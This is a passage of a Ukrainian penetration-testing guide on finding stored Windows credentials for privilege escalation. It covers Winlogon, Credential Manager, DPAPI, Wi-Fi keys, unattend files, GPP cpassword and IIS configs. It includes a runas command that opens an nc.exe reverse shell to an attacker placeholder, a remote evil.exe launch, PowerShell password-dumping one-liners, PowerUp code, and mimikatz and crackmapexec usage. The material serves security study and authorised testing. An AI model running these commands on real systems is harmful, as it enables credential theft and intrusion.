Файлову систему `WSL` можна переглянути в теці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Сам по собі доступ `root` у Linux усередині WSL не надає прав адміністратора Windows. Якщо поточний обліковий запис Windows може читати файлову систему дистрибутива, перегляньте файли історії команд оболонки (зокрема `/root/.bash_history`) на наявність команд, у яких могли зберегтися облікові дані; для підвищення привілеїв однаково потрібен дійсний обліковий запис із вищими привілеями та дозволений спосіб автентифікації. Структура `LocalState\rootfs` застосовується до старіших інсталяцій WSL; у WSL 2 дистрибутив зазвичай зберігається на віртуальному диску [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), тому спочатку визначте фактичний дистрибутив і шлях до його сховища. Не виводьте вміст історії команд під час автоматизованого перебирання.

## Облікові дані Windows

### Облікові дані Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Розглядайте `DefaultUserName` і `DefaultDomainName` як контекст облікового запису, а не облікові дані. Непорожнє значення `DefaultPassword` або `AltDefaultPassword` є знахідкою з відкритим паролем у реєстрі. Якщо `AutoAdminLogon=1`, але пароль у відкритому вигляді прочитати не вдається, це лише зачіпка: [Sysinternals Autologon може зберігати пароль як секрет LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), а звичайне читання реєстру не дає змоги встановити, чи існує цей секрет і чи можна його отримати. Перш ніж повідомляти про розкриття облікових даних, перевірте права доступу та фактичну конфігурацію входу.

### Менеджер облікових даних / Windows vault

З [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault зберігає облікові дані для серверів, вебсайтів та інших програм, які **Windows** може використовувати для **автоматичного входу користувачів**. Спершу може здатися, що користувачі можуть зберігати облікові дані для таких сайтів, як Facebook, Twitter або Gmail, і налаштувати автоматичний вхід у браузерах, але це не так.

Windows Vault зберігає облікові дані, за допомогою яких Windows може автоматично входити в облікові записи користувачів. Це означає, що будь-яка **програма Windows, якій потрібні облікові дані для доступу до ресурсу** (сервера або вебсайту), **може скористатися цим Credential Manager і Windows Vault** та використовувати надані облікові дані, замість того щоб користувачі щоразу вводили ім’я користувача й пароль.

Якщо програми не взаємодіють із Credential Manager, думаю, вони не можуть використовувати облікові дані для певного ресурсу. Тому, якщо вашій програмі потрібно скористатися сховищем, вона має певним чином **взаємодіяти з менеджером облікових даних і запитувати в сховища за замовчуванням облікові дані для цього ресурсу**.

Скористайтеся `cmdkey`, щоб переглянути збережені на комп’ютері облікові дані.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Потім можна використати `runas` з опцією `/savecred`, щоб скористатися збереженими обліковими даними. У наступному прикладі віддалений бінарний файл запускається через SMB-шару.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Використання `runas` із наданими обліковими даними.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Зверніть увагу на mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) або модуль [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Сучасні програми Windows UWP, Microsoft Edge і сучасні системні служби зберігають токени автентифікації та паролі у відкритому тексті у сховищі Universal Windows Platform (UWP) `PasswordVault` (яке також відображається як `Web Credentials` у `vaultcmd`). Це сховище ізольоване в межах сеансу, і його можна розшифрувати нативними засобами без прав адміністратора або `SeDebugPrivilege`.

Виконайте цю команду PowerShell в активному сеансі користувача, щоб миттєво отримати й розшифрувати всі збережені імена користувачів і паролі у відкритому тексті:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** надає метод симетричного шифрування даних, який переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Для значного збільшення ентропії під час шифрування використовуються секретні дані користувача або системи.

**DPAPI дає змогу шифрувати ключі за допомогою симетричного ключа, похідного від облікових секретів користувача**. У випадках системного шифрування використовуються секрети доменної автентифікації системи.

Зашифровані RSA-ключі користувача, захищені за допомогою DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` — це [ідентифікатор безпеки](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, що зберігається поруч із головним ключем, який захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежений, тому переглянути його вміст за допомогою команди `dir` у CMD не вдасться, але це можна зробити через PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Можна скористатися **модулем mimikatz** `dpapi::masterkey` із відповідними аргументами (`/pvk` або `/rpc`), щоб розшифрувати його.

**Файли облікових даних, захищені майстер-паролем**, зазвичай розташовані тут:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Ви можете скористатися **mimikatz module** `dpapi::cred` із відповідним `/masterkey` для розшифрування.\
Ви можете **витягти багато DPAPI** **masterkeys** з **пам’яті** за допомогою модуля `sekurlsa::dpapi` (якщо ви root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Облікові дані PowerShell

**Облікові дані PowerShell** часто використовуються для **скриптів** і завдань автоматизації як зручний спосіб зберігання зашифрованих облікових даних. Вони захищені за допомогою **DPAPI**, а це зазвичай означає, що розшифрувати їх може лише той самий користувач на тому самому комп’ютері, де їх було створено.

Експортований файл облікових даних може мати довільну назву або шлях із розширенням `.xml`. Якщо скрипт чи інвентаризація файлів вказує на такий файл, визначте фактичний каталог профілю облікового запису, а не припускайте, що це `C:\Users`: [Windows може розміщувати профілі в інших місцях](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Файл, який можна прочитати, — це лише зачіпка; [у Windows `Export-Clixml` прив’язує зашифровані облікові дані до користувача й комп’ютера, що виконали експорт](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), а будь-який знайдений обліковий запис має окремо мати належні права доступу до потрібної служби. Спершу перевірте шляхи й ACL, не виводячи зашифровані чи відкриті значення під час звичайного переліку.

Щоб **розшифрувати** облікові дані PS із файлу, що їх містить, виконайте:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Збережені RDP-підключення

Їх можна знайти в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
та в `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Нещодавно виконані команди

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Диспетчер облікових даних віддаленого робочого стола**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Використовуйте модуль **Mimikatz** `dpapi::rdg` з відповідним `/masterkey`, щоб **розшифрувати будь-які файли .rdg**\
За допомогою модуля Mimikatz `sekurlsa::dpapi` можна **витягти багато головних ключів DPAPI** з пам’яті

**mRemoteNG використовує інше сховище підключень.** Перевірте XML-файли, доступні для читання, у `%APPDATA%\mRemoteNG` і папці «Документи» користувача, зокрема файли зі звичайними назвами, як-от `config.xml`. Визначте схему підключень і зашифровані атрибути `Password`, перш ніж вважати XML-файл джерелом облікових даних. Збережене значення не є паролем DPAPI/RDCMan; можливість його відновлення залежить від налаштувань шифрування файлу та від того, чи використовувався власний головний пароль. Під час широкого пошуку не виводьте зашифровані значення.

**Експортовані профілі Remote Desktop Plus** також можуть бути доступні для читання в папках користувачів або спільній папці адміністрування. У застарілому експорті `profiles.xml` є записи `Data/Profile` з елементами `ProfileName`, `Password` і `Secure`. Вважайте непорожній елемент пароля потенційним джерелом облікових даних, але не виводьте його й не припускайте, що він зберігається у відкритому вигляді: [у примітках постачальника](https://www.donkz.nl/) зазначено, що захист профілю може бути прив’язаний до облікового запису й комп’ютера, на яких його створили, або налаштований менш суворо. Перш ніж покладатися на такий файл, з’ясуйте його походження та умови відновлення.

### Sticky Notes

Користувачі часто використовують програму Sticky Notes на робочих станціях Windows, щоб **зберігати паролі** та іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл розташований за шляхом `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; його завжди варто пошукати й перевірити.

Користувачі іноді зберігають паролі та іншу інформацію в програмах для нотаток. Упакована програма Sticky Notes від Microsoft зазвичай зберігає нотатки за шляхом `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; старіші або інші програми можуть використовувати інші сховища в профілі користувача, зокрема LevelDB. Перш ніж вважати відсутність файлу SQLite доказом відсутності нотаток, визначте встановлену програму та формат сховища.

Якщо Sticky Notes використовує журналювання SQLite з випереджальним записом (WAL), копія лише `plum.sqlite` може не містити нещодавно зафіксованих нотаток. Зберігайте відповідний `plum.sqlite-wal` разом із цілісною копією бази даних, а також додайте `plum.sqlite-shm`, якщо він доступний; індекс спільної пам’яті можна відновити, але WAL є частиною постійного стану бази даних. Див. [документацію SQLite щодо WAL](https://www.sqlite.org/wal.html). Нотатка з іменем облікового запису або паролем — лише потенційне джерело облікових даних: окремо перевірте обліковий запис, дозволений доступ і повторне використання пароля. Для розшифрування запису із зашифрованого менеджера паролів також потрібні фактичний ключ розшифрування та інтерпретація, специфічна для цієї програми, перш ніж такий запис можна буде використати як підтвердження входу з вищими привілеями.

### AppCmd.exe

**Зверніть увагу: щоб відновити паролі з AppCmd.exe, потрібні права адміністратора та запуск із рівнем цілісності High.**\
**AppCmd.exe** розташований у каталозі `%systemroot%\system32\inetsrv\`.\
Якщо цей файл існує, можливо, було налаштовано певні **облікові дані**, які можна **відновити**.

Цей код узято з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe` .\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них вразливі до **DLL Sideloading (Інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Файли та реєстр (облікові дані)

### Артефакти облікових даних у реєстрі інструментів підтримки

У деяких старіших інсталяціях засобів віддаленої підтримки значення, пов’язані з паролями, зберігаються під фіксованими ключами реєстру програми. Наприклад, згідно з [поясненням постачальника щодо ключа реєстру](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), у версіях TeamViewer до 9 включно назва `SecurityPasswordAES` позначала налаштований статичний пароль сеансу. Маркер у назві значення — лише підказка для перевірки: перш ніж оцінювати ці облікові дані, перевірте встановлену версію, доступність даних значення для читання, їхній формат і поточну поведінку автентифікації. Перехід від пароля засобу віддаленої підтримки до облікового запису Windows із вищими привілеями також потребує фактичного повторного використання пароля та наявності дозволу на цей обліковий запис. Не виводьте шифротекст і відновлені паролі під час звичайного переліку.

### Спільні електронні таблиці із захищеними аркушами

Якщо є підозра, що доступна для читання спільна книга містить дані облікових записів, розрізняйте **шифрування файлу** та захист аркуша чи прихованих стовпців. [Microsoft зазначає](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), що захист аркуша обмежує редагування й не є функцією безпеки; сам по собі він не підтверджує, що вміст книги зашифрований. Переглядайте лише відповідні файли, до яких маєте дозвіл, і не виводьте потенційні секрети під час широкого переліку. Самі по собі доступний для читання шлях до `.xlsx`, захищений аркуш або прихований стовпець не доводять ані наявності облікових даних, ані вищих привілеїв будь-якого облікового запису; окремо перевірте фактичні дані та поточні права облікового запису.

### Збережені патчі змін CI-сервера

CI-сервер може зберігати надіслані зміни вихідного коду у своєму каталозі даних навіть після завершення збірки. [TeamCity документує](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) каталог `system/changes` як сховище змін віддаленого запуску; каталог даних можна налаштувати, і він не обов’язково розташований у `ProgramData`. Доступний для читання патч може зберегти видалені чи додані посилання на файл облікових даних, ключ шифрування або скрипт, що використовує і те, й інше. Наприклад, для робочого процесу PowerShell із `ConvertTo-SecureString -Key` потрібні і ключ AES, і зашифрований рядок; [Microsoft документує](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), що ключ надається окремо. Спочатку переглядайте лише доступні назви патчів, а потім із належним дозволом перевіряйте відповідний вміст, не виводячи секрети під час звичайного переліку. Самі по собі шлях до патча, зашифроване значення або посилання на ключ не доводять наявності дійсних облікових даних чи доступу з вищими привілеями. Обмежте ACL каталогу даних і не додавайте секрети до змін збірки.

### Власна ротація паролів локального адміністратора

Саморобний засіб ротації паролів може зберігати зашифрований пароль локального адміністратора в локальній службі, а облікові дані сховища даних — у доступному для читання файлі `.env` або поруч із бінарним файлом засобу оновлення. Перевіряйте разом заплановане завдання засобу оновлення, обліковий запис, ACL конфігурації, слухач і дозволи сховища даних. Навіть якщо сховище даних доступне лише через loopback, локальний користувач із дійсними обліковими даними все одно може до нього під’єднатися, але сама автентифікація не доводить наявності дозволу читати відповідні записи. Якщо початкове значення для шифрування або матеріал ключа доступні поруч із шифротекстом, перш ніж покладатися на шифрування, перевірте точний спосіб отримання ключа. Схема, що детерміновано отримує ключ AES із відкритого початкового значення за допомогою Go [`math/rand`](https://pkg.go.dev/math/rand), непридатна для захисту цього пароля; Go зазначає, що цей пакет не підходить для генерації випадкових значень у чутливих до безпеки сценаріях. Перш ніж вважати відновлений пароль вектором підвищення привілеїв, переконайтеся, що він чинний і належить обліковому запису з групи локальних адміністраторів. Самі по собі заплановане завдання, шлях до `.env` або зашифрований блок не підтверджують жодної з цих умов. Не виводьте паролі й матеріал ключів під час звичайного переліку.

Для керування паролями локальних адміністраторів використовуйте [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Його сховище в каталозі або Entra та засоби контролю доступу відрізняються від власного локального сховища даних; так само [ролі Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) визначають, чи може автентифікований користувач сховища даних читати певний індекс.

### Архіви плагінів Java-сервера та повторне використання облікових даних

Деякі плагіни Java-серверів розповсюджуються як JAR-архіви в каталозі сервера `plugins`. Доступний для читання власний плагін може містити конфігурацію або байткод із вбудованими обліковими даними служби. Перевіряйте архів лише за наявності дозволу й не виводьте відновлені секрети під час звичайного переліку. Сам шлях до плагіна не доводить наявності секрету, а відновлений пароль служби дає змогу отримати вищі привілеї лише тоді, коли він також чинний для облікового запису з вищими привілеями. Перевірте відповідні ACL файлів і замініть повторно використані облікові дані на окремі секрети. Див. [посібник PaperMC зі встановлення плагінів](https://docs.papermc.io/paper/adding-plugins/) щодо структури каталогів і [документацію Oracle про JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) щодо вмісту архівів.

### Облікові дані вбудованої бази даних Openfire

Інсталяція Openfire із вбудованою базою даних може зберігати `openfire.script` у каталозі `Openfire\embedded-db`. Якщо поточний обліковий запис може читати цей файл, перегляньте разом записи `OFUSER` і властивість `passwordKey`. У [документації Openfire щодо провайдера користувачів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) зазначено, що паролі можуть зберігатися у відкритому тексті або шифруватися ключем, записаним у цій властивості. Відновлений пароль важливий для підвищення привілеїв лише тоді, коли він досі чинний для ідентичності з вищими привілеями; сама назва файлу не доводить ані доступу для читання, ані повторного використання облікових даних. Цей шлях — лише підказка для інвентаризації, тому не виводьте вміст бази даних і облікові дані під час звичайного переліку.

Окремий файл `Openfire\conf\openfire.xml` може показати налаштовані порти й інтерфейс прив’язки консолі адміністратора, навіть якщо використовується зовнішня база даних. Зазвичай Openfire прив’язує консоль адміністратора до loopback; проте локальний обліковий запис усе одно може під’єднатися до цієї адреси, якщо слухач запущений. Перевіряйте разом фактичний слухач, призначену роль адміністратора, політику завантаження плагінів і ідентичність служби Openfire. Адміністратор, який може встановлювати плагіни, може запускати код плагіна в контексті служби; якщо служба працює як LocalSystem, цей контекст може мати високі привілеї. Самі по собі збіг пароля облікового запису або доступний для читання шлях до конфігурації не доводять доступу до консолі адміністратора чи виконання коду. Див. посібник постачальника з [інсталяції та керування плагінами](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) і [властивість API завантаження плагінів](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Конфігурація сервера керування криміналістичними дослідженнями

Конфігурації сервера Velociraptor, зазвичай названі `server.config.yaml`, можуть містити `CA.private_key` внутрішнього центру сертифікації. Якщо користувач із нижчими привілеями може читати цей ключ, він може створити клієнтський сертифікат API. Чи призведе це до вищих привілеїв, залежить від ролей користувачів на сервері, доступності API та ідентичності, від імені якої працює сервер або цільовий агент. Клієнтська конфігурація містить інші дані; її виявлення не підтверджує доступу до CA сервера. У деяких розгортаннях закритий ключ CA зберігається офлайн, тому доступна для читання конфігурація сервера може не містити ключа підпису.

На Windows-сервері перевірте ACL конфігурації **сервера** в каталозі інсталяції та всіх захищених резервних копій. Одне з можливих розташувань — `%ProgramFiles%\VelociraptorServer\server.config.yaml`; якщо налаштований шлях служби інший, використовуйте його. Переконайтеся, що поточна ідентичність може читати файл і що `CA.private_key` справді присутній. Не виводьте закритий ключ у журнали чи результати переліку. Робочий процес постачальника `config api_client` використовує ключ CA для видачі клієнтського сертифіката, але також потрібна ефективна роль на сервері; її створення або зміна можуть потребувати доступу на запис до сховища даних або перезапуску. Наявна привілейована ідентичність сервера може забезпечити шлях до доступу, навіть якщо записати ці зміни неможливо. API-запити з правами на виконання запускаються в контексті відповідного сервера або агента, який може мати високі привілеї.

Захистіть конфігурацію сервера й резервні копії обмежувальними ACL, за можливості зберігайте ключ підпису CA офлайн і обмежте ролі API та доступ до слухача. Див. [документацію Velociraptor API](https://docs.velociraptor.app/docs/server_automation/server_api/) і [рекомендації з налаштування безпеки](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY — це окремий менеджер сеансів. Його власне зашифроване сховище може розташовуватися за шляхом `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, тоді як експортована резервна копія сеансів може мати назву `sessions-backup.dat` і зберігатися в іншому місці. [Посібник SolarWinds з експорту](https://thwack.solarwinds.com/discussion/comment/115591) зазначає, що експорти зашифровані паролем і можуть містити сеанси, ключі, скрипти, теги та зв’язки; [форум підтримки](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) вказує на власне сховище. Спершу перевірте дозволи на файли та шляхи. Виявлення будь-якого з цих файлів не розкриває його пароль і не доводить, що збережені облікові дані досі дійсні або надають вищі привілеї.

### Ключі SSH-хостів PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-ключі в реєстрі

Приватні SSH-ключі можуть зберігатися в розділі реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тож перевірте, чи є там щось цікаве:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Якщо в цьому шляху знайдеться будь-який запис, імовірно, це збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Більше інформації про цю техніку: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Якщо служба `ssh-agent` не запущена й потрібно, щоб вона автоматично запускалася під час завантаження системи, виконайте:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Схоже, цей метод більше не працює. Я спробував створити SSH-ключі, додати їх за допомогою `ssh-add` і ввійти на машину через SSH. Розділу реєстру HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час автентифікації за допомогою асиметричного ключа.

### Файли автоматичного встановлення

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Також можна шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Резервні копії SAM і SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Читабельні файли резервних копій Windows Imaging (`.wim`) також можуть містити автономні hive `SAM`, `SECURITY` і `SYSTEM`. Насамперед перевіряйте локально доступні каталоги резервних копій або образів і переглядайте **назви елементів** образу, перш ніж щось видобувати: сама назва файлу `.wim` не доводить, що в ньому доступні hive, а звичайні образи `install.wim`, `boot.wim` і відновлення часто виявляються хибними зачіпками. SMB share — це окремий шлях доступу, і його слід перевіряти лише тоді, коли ця share входить до сфери перевірки. Див. рекомендації Microsoft щодо [образів Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) і [довідку щодо файлів registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Хмарні облікові дані

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Знайдіть файл **SiteList.xml**

### Кешований пароль GPP

Раніше була доступна функція, яка дозволяла розгортати власні облікові записи локального адміністратора на групі комп’ютерів за допомогою Group Policy Preferences (GPP). Однак цей метод мав серйозні недоліки безпеки. По-перше, об’єкти групової політики (GPO), що зберігалися у SYSVOL як XML-файли, могли бути доступні будь-якому користувачу домену. По-друге, паролі в цих GPP, зашифровані за допомогою AES256 із загальнодоступним документованим ключем за замовчуванням, міг розшифрувати будь-який автентифікований користувач. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Щоб зменшити цей ризик, було розроблено функцію для пошуку локально кешованих файлів GPP, що містять непорожнє поле "cpassword". Знайшовши такий файл, функція розшифровує пароль і повертає власний об’єкт PowerShell. Цей об’єкт містить відомості про GPP і розташування файлу, що допомагає виявити й усунути цю вразливість безпеки.

Шукайте ці файли в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Використання crackmapexec для отримання паролів:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Конфігурація вебсервера IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

